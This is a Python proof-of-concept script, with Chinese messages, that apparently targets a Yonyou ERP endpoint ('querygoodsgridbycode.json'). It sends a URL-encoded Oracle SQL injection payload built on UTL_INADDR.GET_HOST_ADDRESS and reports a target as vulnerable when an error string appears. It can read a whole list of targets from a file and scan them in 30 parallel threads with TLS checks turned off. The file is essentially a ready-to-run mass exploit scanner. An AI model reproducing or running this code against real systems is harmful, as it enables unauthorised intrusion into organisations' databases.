from lxml import etree
import requests
from multiprocessing.dummy import Pool
import argparse
import textwrap
requests.packages.urllib3.disable_warnings()
import re
def check(url):
    try:
        url1 = f"{url}/ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28116%29%7C%7CCHR%28101%29%7C%7CCHR%28115%29%7C%7CCHR%28116%29%7C%7CCHR%2849%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%2850%29%7C%7CCHR%28116%29%7C%7CCHR%28101%29%7C%7CCHR%28115%29%7C%7CCHR%28116%29%29--+dpxi"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }
        response = requests.get(url=url1,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and '未知的主机' in response.text:
            print(f'[*]{url}:漏洞存在')
        else:
            print('无法执行')
    except Exception as e:
        print('延时')


def main():
    parser = argparse.ArgumentParser(description="这 是 一 个 poc",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent('''python yongyu.py -u http://127.0.0.1:8000/'''))
    parser.add_argument('-u', '--url', help="python yongyu.py -u http://127.0.0.1:8000/", dest='url')
    parser.add_argument('-r', '--rl', help="python yongyu.py -r 1.txt", dest='rl')
    args = parser.parse_args()
    u = args.url
    r = args.rl
    pool = Pool(processes=30)
    lists = []
    try:
        if u:
            check(u)
        elif r:
            with open(r, 'r') as f:
                for line in f.readlines():
                    target = line.strip()
                    if 'http' in target:
                        lists.append(target)
                    else:
                        targets = f"http://{target}"
                        lists.append(targets)
    except Exception as e:
        print(e)
    pool.map(check, lists)


if __name__ == '__main__':
    main()
    banner = '''
        .__           .__  .__                                      
    |  |__   ____ |  | |  |   ____    __ __  ______ ___________ 
    |  |  \_/ __ \|  | |  |  /  _ \  |  |  \/  ___// __ \_  __ \
    |   Y  \  ___/|  |_|  |_(  <_> ) |  |  /\___ \\  ___/|  | \/
    |___|  /\___  >____/____/\____/  |____//____  >\___  >__|   
         \/     \/                              \/     \/       
                '''
    print(banner)